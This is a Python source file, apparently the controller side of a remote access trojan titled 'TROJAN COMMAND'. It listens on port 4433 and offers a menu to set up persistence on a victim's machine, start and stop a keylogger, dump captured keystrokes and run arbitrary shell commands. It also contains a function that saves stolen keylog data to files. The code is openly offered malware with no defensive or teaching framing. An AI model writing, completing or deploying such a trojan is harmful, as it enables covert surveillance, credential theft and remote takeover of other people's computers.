from datetime import datetime
import os
import socket

HOST = '0.0.0.0'
PORT = 4433
KEYLOGGER_PATH = 'Keylog_dumps'


def print_banner():
    print("""
╔══════════════════════════════════════════════════╗
║                                                  ║
║              TROJAN COMMAND                      ║
║                  by whoami                       ║
║                                                  ║
╚══════════════════════════════════════════════════╝
""")


def print_help():
    print("""
╔══════════════════════════════════════════════════════════╗
║                  AVAILABLE COMMANDS                      ║
╚══════════════════════════════════════════════════════════╝

PERSISTENCE:
  /persistence status          - Chack persistence status
  /persistence setup           - Setup persistence

KEYLOGGER:
  /keylog status               - Check keylloger status
  /keylog start                - Start keylloger
  /keylog stop                 - Stop keylloger
  /keylog dump                 - Dump captured keys

SYSTEM:
  cd <path>                    - Change directory
  /exit                        - Disconnect client
  /help                        - Show this help menu
  /clear                       - Clear screen
  hostname           - Show computer name

SHELL COMMANDS:
    Anny other command will be executed as shell command
""")


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def seve_keylog(data, filename=None):
    try:
        if not os.path.exists(KEYLOGGER_PATH):
            os.makedirs(KEYLOGGER_PATH)
    
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'keylog_{timestamp}.txt'
    
        file_path = os.path.join(KEYLOGGER_PATH, filename)
    
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(data)
    
        print(f'\n[+] Keylog saved as: {filename}')
        return True
    
    except Exception as e:
        print(f'\n[-] Error saving keylog: {e}')
        return False